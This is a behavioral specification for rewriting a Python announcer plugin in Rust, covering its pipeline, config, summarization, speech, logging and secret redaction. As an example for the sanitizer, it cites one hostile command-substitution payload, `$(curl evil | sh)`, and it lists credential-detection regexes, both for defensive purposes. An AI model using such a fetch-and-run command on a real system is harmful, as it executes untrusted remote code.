# Core pipeline behavioral spec (parity with Python v0.9.1)

The Python sources are authoritative; this file is the condensed contract plus the
subtleties a rewrite gets wrong. File references are to this repo.

## CLI surface (`announce.py`)

- `--test` — test announcement (bypasses status filter, mutes, snooze, debounce;
  no rollback). Text: `Announcer is working`. Combining `--test` with a subcommand
  → usage error, exit 2.
- `setup` — wizard. `status` — diagnostics. Errors in these →
  `announcer error: {e}` on stderr, exit 1, no logging.
- No args + stdin is a TTY → print usage to stderr, exit 2, **create nothing on
  disk**. No args otherwise → hook mode: event from `$HERDR_PLUGIN_EVENT_JSON`
  (absent env var → read stdin).
- Hook mode: mkdir state dir, run pipeline, persist last-error, log, exit 0; on
  exception append reason `error: <str(e)[:120] or ClassName>`, log
  `action=error` with full traceback appended after the log line, stderr
  `announcer error: {e}`, exit 1.
- `elapsed` in the log is measured from the top of main (includes arg parsing),
  formatted `%.3f`.

Rust adds: `dashboard [snooze <spec>|toggle-toast|open]` (absorbing Python's
`dashboard.py` CLI, same USAGE string + exit 2 on bad args), `action <id>`,
`cleanup`.

## Config

### DEFAULTS (order matters — drives `status` output; `announcer/config.py:13`)

```
announce = ["done", "blocked"]      debounce_seconds = 30
summary = "codex"                   summary_fallback = "template"
summary_first_activity_timeout_seconds = 5
codex_model = "gpt-5.6-luna"        codex_effort = "low"
codex_timeout_seconds = 45          summary_command = None
summary_command_timeout_seconds = 60
style = "announcement"              custom_prompt = ""
speak_command = None                elevenlabs_api_key = ""
elevenlabs_voice_id = "21m00Tcm4TlvDq8ikWAM"
elevenlabs_model = "eleven_turbo_v2_5"
voice = ""                          toast = False
```
NEW (appended after `toast`): `mute_agents = []` (lowercased agent-type names,
matched case-insensitively against event `agent` then `display_agent`; non-array →
treated as `[]` with reason `config: mute_agents ignored`), `announce_on_detect =
false`.

- Loading: missing file → defaults. Only known keys merge; unknown top-level keys
  are collected sorted for `status` (`unrecognized keys:` line). Rust: parse with
  toml_edit; the Python-3.9 tiny-TOML fallback is obsolete — do not port it.
- Hard validation (only two): `announce` must be an array →
  `ValueError("announce must be an array of strings")`; `debounce_seconds` must be
  an integer, bools and floats rejected →
  `ValueError("debounce_seconds must be an integer")`.
- All timeout values resolve at call sites via positive-finite-float checks; an
  invalid value makes that backend fail into the fallback chain **before spawning**
  (never a hard error).

### Directory resolution (`announcer/paths.py`)

`HERDR_PLUGIN_CONFIG_DIR` / `HERDR_PLUGIN_STATE_DIR` (empty string = unset),
resolved **independently**; fallback to the conventional locations
(`~/.config/herdr/plugins/config/nhclink16.announcer`,
`~/.local/state/herdr/plugins/nhclink16.announcer`). The state dir never comes
from a herdr probe and never falls back to cwd. (Python also shells out to
`herdr plugin config-dir` — the Rust version replaces that with the `plugin.list`
RPC when the socket is available, else the conventional path.)

## Pipeline (`announce.py process_invocation`) — exact order

```
load config → parse event → status filter        → action "skipped-status"
→ agent-type mute   [NEW]                        → action "muted-agent"
→ per-pane mute     [NEW]                        → action "muted-pane"
→ global snooze                                  → action "snoozed"
→ debounce reserve                               → action "debounced"
→ context → transcript → summarize → sanitize → toast → speak
→ action "announced+summary-{backend}+speak-{backend}"
```
- Everything from context onward is wrapped: any exception → rollback the debounce
  reservation, re-raise. `PlaybackLockTimeout` → rollback + action
  `"gave-up-waiting"`.
- The mute gates sit after the status filter (an unsubscribed status still logs
  `skipped-status` truthfully) and before global snooze.
- Announce filter: lowercase set of the configured strings; non-string entries
  ignored; status already lowercased.

### Event parsing (`announcer/herdr.py:28`)

**First unwrap the envelope** [Phase 0 finding]: `HERDR_PLUGIN_EVENT_JSON` is
`{"event": "...", "data": {...}}` — parse `.data` (fall back to the whole object
if `data` is absent, which also keeps stdin-fed test fixtures working). Then:
prefer top-level string `pane_id` / `agent_status`; each falls back independently
to a recursive first-string-for-key search (dicts: direct key first, then values
in order; lists in order). Errors: `event payload has no string pane_id` /
`...no string agent_status` / `event payload has invalid agent_status`. Status
lowercased, must be in `{idle,working,blocked,done,unknown}`.

### Context and transcript (socket now)

- Name precedence: event `display_agent` → `agent` → `"an agent"`. Workspace
  label: `workspace.list`, match `workspace_id` or `id`, first non-empty of
  `label|title|name`; failure → reasons `herdr-workspace: <detail>` /
  `herdr: workspace-not-found`, degrade to `""`. Never fatal.
- Transcript: `pane.read {source:"recent_unwrapped", lines:100}`; extract text
  permissively (first of keys `text|output|content|transcript`, string or
  all-string array joined with `\n`; non-JSON → as-is); keep last **4000 chars**
  (char boundaries). Failure → reason `herdr-read: <detail[:120] or ClassName>`,
  transcript `""`.

### Debounce (`announcer/speech.py:28-169`)

- `last.json` = `{pane_id: {"status": str, "ts": float}}`, compact sorted JSON +
  `\n`, atomic. All under flock on `debounce.lock` (open append+create).
- Debounced iff same status AND ts finite, non-bool, `ts <= now`, `now - ts <=
  seconds`. Future/NaN/Inf never debounce.
- Reserve: prune (future/non-finite/non-numeric/bool ts, or older than 86400 s),
  write `{status, ts: now}`, return reservation token = that exact `now` float.
- Rollback: delete only if status matches AND (reservation is None or
  `entry.ts == reservation` — float equality; serde must round-trip f64 exactly).

### Snooze (`announcer/snooze.py`)

- `snooze.json` = `{"until": epoch_float}` compact + `\n`. Read: `until > now`
  else 0.0; any error → 0.0. Gate: `read_snooze() > 0.0`.
- Steps `("5m","30m","2h","tomorrow","off")`, `SNOOZE_HOUR = 8`.
- `parse_duration`: lowercase/strip; "" → invalid; `off|0|none` → 0; unit from
  last char (s/m/h, else whole string is seconds); numeric part must be all
  digits (`1.5h`, `-5m`, `5min` invalid → usage exit 2).
- `tomorrow` → next local 08:00:00 (if today's 08:00 has passed, tomorrow's);
  DST-correct via local timezone.
- Step classification for cycling: off if remaining <= 0; `tomorrow` if the local
  time of `until` is exactly 08:00:00; then <=300 → 5m, <=1800 → 30m, else 2h.
- Display strings (verbatim): `off`, `"{h}h {mm:02d}m left"`,
  `"{m}m {ss:02d}s left"`, `"{s}s left"`, `"until %H:%M"`, `"until tomorrow"`,
  labels `"<step-or-until> · <remaining>"`, messages `snooze off` /
  `snoozed until HH:MM` / `snoozed · <remaining>`.

## Summarization (`announce.py:28-61`, `announcer/summarize.py`)

Chain:
```
mode = lower(summary)
mode == "template"           → template, backend "template"  (fallback IGNORED)
transcript non-empty:
  mode == "codex"            → codex_summary
  mode == "command"          → command_summary
generated → (text, mode)
lower(summary_fallback) == "codex" AND transcript AND mode != "codex"
                             → codex_summary → backend "codex-fallback"
else                         → template, backend "template"
```
**Empty transcript skips ALL LLM paths including the fallback.** An unknown
`summary` value generates nothing but is still eligible for the codex fallback.

Template: `location = " in {workspace}"` when non-empty;
`done` → `"{name} finished{location}."`; `blocked` → `"{name} needs your
input{location}."`; else `"{name} is now {status}{location}."`

Prompts — copy verbatim from `announcer/summarize.py:16-33`
(`ANNOUNCEMENT_PROMPT`, `SUMMARY_PROMPT`); substitution is plain string replace of
`{agent}`, `{workspace}`, `{status}` in that order. Final codex prompt:
`"{prompt} --- terminal output --- {transcript}"`. Style selection: `custom` uses
`custom_prompt` when non-empty str; `summary` → SUMMARY_PROMPT; else
ANNOUNCEMENT_PROMPT.

### codex backend

argv exactly:
```
codex exec --json -m <codex_model> -c model_reasoning_effort=<codex_effort>
  --sandbox read-only --ephemeral --ignore-user-config --ignore-rules
  --skip-git-repo-check <prompt>
```
stdin null, stdout/stderr piped; a reader thread pumps stdout lines into a
channel (always sending an EOF sentinel), another drains stderr (cap 4000 chars
but keep draining to avoid pipe deadlock).

Two-phase deadline (`announcer/deadline.py`): first-activity window =
`summary_first_activity_timeout_seconds` from spawn; completion window =
`codex_timeout_seconds` **starting at first recorded activity** (worst case =
first + completion). Activity = any `item.started` / `item.completed` whose
`item.type` ∈ `{agent_message, reasoning, command_execution, mcp_tool_call,
web_search}`. Last completed `agent_message` text wins; `turn.completed` returns
it; `turn.failed` / `error` → reasons `codex: turn.failed` / `codex: error`;
EOF sentinel → return what we have. Timeout messages: first →
`Codex produced no model activity` (reason `codex: timeout-first-activity`),
completion → `Codex summary timed out` (reason `codex: timeout-completion`).
Other reasons: `codex: missing-stream`, `codex: no-summary`,
`codex: empty-after-sanitize`, `codex: <detail[:120]>`; the last non-empty stderr
line (120 chars) is appended to the codex reason. Always stop the subprocess in a
finally (terminate → 0.5s wait → kill; errors swallowed).

### command backend

- `summary_command` must be a non-empty string array → else reason
  `command: invalid-command`.
- `{agent}/{workspace}/{status}` replaced in every argv element.
- Env adds `HERDR_SUMMARY_FIRST_ACTIVITY_TIMEOUT_SECONDS` and
  `HERDR_SUMMARY_OVERALL_TIMEOUT_SECONDS` (raw string of the config values).
- Transcript on stdin; outer wall timeout = first + completion + 2.0 (defaults
  67s). Output = last non-empty stdout line. check=true.
- Reasons: `command: timeout`, `command: no-output[ <redacted stderr tail 120>]`,
  `command: empty-after-sanitize`, `command: <redacted detail[:120]>`. All
  details pass through `redact_command_text` with the configured argv.

### Sanitizer (`summarize.py:60-66`) — security boundary

Keep chars where `is_alphabetic() || is_numeric()` (Unicode-aware — CJK/accents
survive) or in `" ,.!?-"`; others → space; collapse whitespace; cap **40 words**.
Applied inside each LLM backend AND again in the pipeline. Apostrophes die
(`agent's` → `agent s`); `$(curl evil | sh)` → `curl evil sh`.

## Speech (`announcer/speech.py`)

Selection (first match wins):
1. `speak_command` set → playback lock → run custom → backend `"command"`.
   Failures propagate (no fallback).
2. `elevenlabs_api_key` truthy → **probe the audio player BEFORE the paid HTTP
   call** (no player → reasons `elevenlabs: no-player` + `play: mpv/ffplay
   missing`, fall through to local). Synthesize OUTSIDE the lock, play inside →
   `"elevenlabs"`. HTTP failure → reason `elevenlabs: HTTP {code}` /
   `elevenlabs: <detail>`, fall through to local. Temp audio file in state dir,
   always unlinked.
3. Local → `"say"|"spd-say"|"espeak-ng"|"espeak"`.

Custom command: argv strings; any arg containing `{text}` → substitute all
occurrences, stdin none; else text on stdin. timeout 60, check=true. On failure
the error is re-raised with **redacted** argv/stderr/output (exception type
preserved).

Local: macOS `say` (+ `-v <voice>` when set), text stdin, 60s. Linux probe order
with per-tool timeouts: `spd-say -e -w` **5s** (a stopped speech-dispatcher exits
0 silently), `espeak-ng` 60s, `espeak` 60s; text on stdin; accumulate reasons
`{name}: timeout` / `{name}: <detail[:120]>`; all fail → re-raise the last error.
Other OS → error `local text-to-speech is unsupported on {system}`.

ElevenLabs: POST
`https://api.elevenlabs.io/v1/text-to-speech/{urlencode(voice_id)}?output_format={fmt}`,
headers `xi-api-key`, `Content-Type: application/json`, body
`{"text":..., "model_id":...}`, 30s. Player probe: MP3 players Darwin order
`afplay,mpv,ffplay`, else `mpv,ffplay,afplay`; raw-PCM-only fallbacks
`paplay,pw-play,aplay` use `output_format=pcm_22050`. Play argv:
```
paplay --raw --rate=22050 --channels=1 --format=s16le <path>
pw-play --rate=22050 --channels=1 --format=s16 <path>
aplay --file-type=raw --format=S16_LE --rate=22050 --channels=1 <path>
mpv --no-video <path> · ffplay -nodisp -autoexit <path> · afplay <path>
```
timeout 60.

Playback lock: flock LOCK_EX|LOCK_NB polled on `speak.lock`, timeout 90s, poll
0.5s; timeout → reason `playback-lock: timeout` + `PlaybackLockTimeout`.

`capabilities()` probe order (also `status` output order):
`codex, claude, say, spd-say, espeak-ng, espeak, mpv, ffplay, afplay, paplay,
pw-play, aplay`.

## Toast

`notification.show` (socket) with the sanitized text, sent BEFORE speaking, only
when `toast` truthy. Failure → reason `toast: <detail>` / `toast: exit-{n}`
style, never fatal. (Phase 0 decides title/body split; default `sound: "none"`.)

## Logging (`announcer/log.py`)

- Line: `"{ts} pane_id={p} status={s} action={a} elapsed={e:.3f}"` +
  `" reasons={r1;r2}"` when present, + `\n`. Fields whitespace-collapsed, empty →
  `-`. `ts` = local time with offset, seconds precision
  (`2026-08-18T19:04:11+02:00`).
- Error invocations append the traceback after the line.
- Trim before every append, under flock on `announcer-log.lock`: size > 512 KiB →
  keep last 256 KiB, drop through first `\n`, atomic replace.
- Read: seek to last 64 KiB, drop partial first line, parse (split on literal
  `" reasons="` first; token 0 is the timestamp only if it contains no `=`),
  keep last 200, return last `limit` oldest-first.
- `last-error.json` `{"reasons":[...],"timestamp":"<iso>"}` — written only when
  reasons non-empty, **never cleared on success**.

### Action vocabulary (API — preserve verbatim, plus new)

`skipped-status, snoozed, debounced, gave-up-waiting, error, announced+{backend}`
(test mode), `announced+summary-{template|codex|command|codex-fallback}+speak-
{command|elevenlabs|say|spd-say|espeak-ng|espeak}`. NEW: `muted-agent`,
`muted-pane`, `cleanup` (only when an entry was actually removed), detect events
log `status=detected`, announce-now adds reason `manual`.

## `status` output (byte-stable; `announce.py:210-266`)

```
herdr-announcer status
config: <config_dir>/config.toml (exists|missing)
state: <state_dir>
values:
  <key> = <python-json value>     # DEFAULTS order; json.dumps style: null/true,
                                  # ", " and ": " separators in arrays/objects
capabilities:
  codex: yes|no                   # 12 names, probe order above
unrecognized keys: <comma-joined>|none
last error: none | last error: <ts> <reasons joined by ";">
log (last 8 lines):               # or: log: not found (<path>)
  <line>
```
`elevenlabs_api_key` masked (`****` + last4); `summary_command`/`speak_command`
redacted; last-error and log lines pass through configured-secret redaction.
New keys print after `toast` (documented additive change).

## Redaction (`announcer/redact.py`) — port regex-for-regex

```
_SENSITIVE_NAMES = {api_key, authorization, auth_token, access_token,
                    bearer_token, password, passwd, secret, token}
_HEADER_SECRET_RE = (?i)(\b(?:authorization|x-api-key|api-key)\s*:\s*(?:bearer\s+)?)([^\s,;]+)
_QUERY_SECRET_RE  = (?i)([?&](?:api[_-]?key|access[_-]?token|auth[_-]?token|token|secret|password)=)([^&\s]+)
_PREFIXED_CREDENTIAL_RE = ^(?:sk-[A-Za-z0-9_-]{8,}|ghp_[A-Za-z0-9_-]{8,}|xoxb-[A-Za-z0-9_-]{8,}|AKIA[A-Z0-9]{16})$
_JWT_RE = ^[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{4,}$
_BEARER_RE = (?i)^(bearer\s+)(\S+)$
high-entropy: len>=20, no whitespace, has lower+upper+digit
sensitive short options: {"-p"}
```
- `mask_secret`: "" → ""; len>4 → `****`+last4; else `****`.
- Sensitive name: strip leading `-`, lowercase, `-`→`_`, exact match or endswith
  `_api_key|_token|_secret|_password|_passwd`.
- Value redaction order: existing filesystem path → leave alone; embedded
  header/query secrets; `Bearer <tok>`; value containing whitespace → leave
  alone; prefixed-credential/JWT/high-entropy → mask whole.
- Command redaction: bare sensitive flag masks the NEXT arg; `name=value` masks
  by name; attached `-Xvalue` forms split and mask for `-p` and sensitive longs;
  positionals (incl. argv[0]) get value redaction.
- `redact_command_text(text, argv)`: replace every discovered secret
  (longest-first) with its mask, then apply header/query regexes.
- End-to-end invariant: a secret in configured argv appears in NONE of stderr,
  `announcer.log`, `last-error.json`, `status` output; its mask appears in all.

## State files summary (all atomic tmp+rename, flock'd)

| file | lock | format |
|---|---|---|
| last.json | debounce.lock | compact sorted JSON + \n |
| snooze.json | (writer-side) | `{"until": f}` compact + \n |
| pane-mutes.json (NEW) | mutes.lock | `{pane_id:{until,at,agent}}` compact sorted + \n |
| announcer.log | announcer-log.lock | text lines |
| last-error.json | — | compact sorted + \n |
| config.toml | config.toml.lock | TOML (+ .bak copy) |

## New feature semantics (from the approved design)

- Per-pane mute: `until: 0` = until pane dies; `until: epoch` = timed. Read drops
  expired; write prunes entries with `at` older than 7 days. Machine-readable
  marker via `pane.report_metadata` `tokens {"muted":"1"}`, `ttl_ms` 86400000;
  unmute/cleanup sends `tokens {"muted":null}`. **No visible badge in v1.0**
  [Phase 0 finding: `state_labels` keys are runtime-validated and reject
  free-form keys like `muted`; the only accepted keys masquerade agent status].
  User feedback = the action toast + the dashboard's Muted section.
- `cleanup` (pane.closed/pane.exited hooks): remove that pane's entry; log
  `action=cleanup` only when something was removed, else exit silently.
- Actions: `mute-pane` toggle (toasts `Announcer: pane muted until it closes` /
  `Announcer: pane unmuted`), `snooze-pane` cycles 5m→30m→2h→off (toast with
  remaining), `announce-now` (status/name from context else `pane.get`;
  transcript→summarize→sanitize→toast→speak; bypasses filter/mutes/snooze/
  debounce; still takes the playback lock; reason `manual`). Missing pane context
  and failed `pane.current` → toast `Announcer: no target pane`, exit 1.
- `pane.agent_detected` announcements (gated by `announce_on_detect`, default
  off): template-only text `"{name} agent detected{location}."`, runs mutes →
  snooze → debounce (status key `"detected"`) → sanitize → toast → speak.
  **Skip release events** [Phase 0 finding: the same event fires with
  `released: true` + `final_status` when an agent leaves — announce only when
  `released` is absent or false].

## 26 subtleties checklist (verify each in review)

1. Filter → mute → snooze → debounce ordering is load-bearing for log truthfulness.
2. Test mode bypasses filter/mutes/snooze/debounce, never rolls back.
3. Debounce token = exact wall-clock float; rollback compares equality.
4. Rollback fires on ANY exception after reserve (incl. speech failure).
5. Future/NaN/Inf timestamps never debounce; pruned on next save.
6. Sanitizer runs twice for LLM output.
7. Sanitizer is Unicode-aware, not ASCII.
8. Codex completion window starts at FIRST activity; `item.started` counts.
9. Stdout EOF sentinel means "return what we have", not timeout.
10. Every summary_command gets first+completion+2.0 wall timeout.
11. Invalid/non-finite timeouts abort the backend BEFORE spawning.
12. Empty transcript disables all LLM paths including fallback.
13. `summary="template"` ignores `summary_fallback`; unknown summary still allows fallback.
14. ElevenLabs player probed before the paid HTTP call; raw-only players switch format to pcm_22050.
15. spd-say 5s / espeak variants 60s.
16. Four distinct flock files; open append+create, never truncate; unlock on drop.
17. Atomic writes everywhere; compact sorted JSON (+`\n`); snooze.json unsorted single key.
18. Log trim before every append under the same lock.
19. last-error.json never cleared on success.
20. Config/state dirs resolved independently; state never from probe/cwd.
21. (tiny-TOML quirks — obsolete in Rust, reasons `config: skipped line N` disappear.)
22. Unknown config keys dropped from the merged config, surfaced in `status` only.
23. Exception argv/stderr redacted while preserving the failure type/semantics.
24. Redaction leaves whitespace-containing values and existing paths alone.
25. `elapsed` measured from top of main, `%.3f`.
26. Socket call timeouts: 5s per RPC; custom speak 60s; playback 60s; ElevenLabs HTTP 30s.
